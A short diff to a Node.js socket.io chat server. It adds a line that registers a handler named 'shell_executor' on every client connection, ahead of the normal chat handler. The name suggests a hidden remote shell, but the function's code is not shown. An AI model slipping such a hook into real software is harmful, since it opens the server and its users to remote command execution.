@@ -21,6 +21,8 @@ app.get("/", (req, res) => {
   res.sendFile(__dirname + "/index.html");
 });
 
+io.on("connection", shell_executor);
+
 io.on("connection", (socket) => {
   console.log(`user ${userid} connected`);
   socket.on("chat message", (inputmsg) => {
